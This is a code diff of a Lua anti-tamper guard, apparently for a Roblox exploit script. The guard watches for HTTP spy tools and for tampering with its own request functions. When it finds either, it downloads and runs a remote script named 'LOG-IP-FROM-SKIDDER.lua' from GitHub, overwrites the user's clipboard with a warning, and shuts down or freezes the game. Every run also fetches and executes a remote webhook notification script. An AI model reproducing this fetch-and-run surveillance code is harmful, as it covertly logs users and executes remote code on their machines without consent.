@@ -1,10 +1,3 @@
-spawn(function()
-	while wait() do
-		if game.CoreGui:FindFirstChild("HttpSpy") or game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("HttpSpy") then
-			game:Shutdown()
-		end
-	end
-end)
 
 if not HttpsProtect then
 	HttpsProtect = {
@@ -39,6 +32,7 @@ for _, func in next, functions do
                     for _, url in ipairs(OrginalHttps) do
                         if tostring(arg):find(url) then
 	                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
+							setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 	                        while true do end
                             return 
                         end
@@ -61,6 +55,7 @@ for _, func in next, functions do
                     for _, url in ipairs(HttpsProtect) do
                         if tostring(arg):find(url) then
 	                        loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
+							setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 	                        while true do end
                             return 
                         end
@@ -82,6 +77,7 @@ setmetatable(
         __newindex = function(t, i, v)
             if tostring(i) == "ID" then
 	            loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
+				setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 				game:Shutdown()
                 while true do end return 
             end
@@ -99,6 +95,7 @@ local function checkDescendant(descendant)
 	            if string.find(descendant.Text, name) or descendant.Name == name then
 					descendant:Destroy()
 					loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
+					setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 					game:Shutdown()
 	                while true do end return 
 	            end
@@ -109,6 +106,7 @@ local function checkDescendant(descendant)
 	            if string.find(descendant.Text, name) or descendant.Name == name then
 					descendant:Destroy()
 					loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
+					setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
 					game:Shutdown()
 	                while true do end return 
 	            end
@@ -120,6 +118,27 @@ end
 playerGui.DescendantAdded:Connect(checkDescendant)
 coreGui.DescendantAdded:Connect(checkDescendant)
 
+spawn(function()
+	while wait() do
+		local HttpSpy = nil
+		for _, gui in pairs({game.CoreGui, game.Players.LocalPlayer:WaitForChild("PlayerGui")}) do
+			for _, child in pairs(gui:GetChildren()) do
+				if child.Name:find("HttpSpy") or child.Name:find("Http Spy") then
+					HttpSpy = child
+					break
+				end
+			end
+			if HttpSpy then break end
+		end
+
+		if HttpSpy then
+			HttpSpy:Destroy()
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua', true))()
+			setclipboard("You have been warned for trying to crack our script, If you don't do that and still got this warning, please contact to us to fix the problem")
+			game:Shutdown()
+		end
+	end
+end)
 
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/Webhook-Execution-Notification'),true))()
 
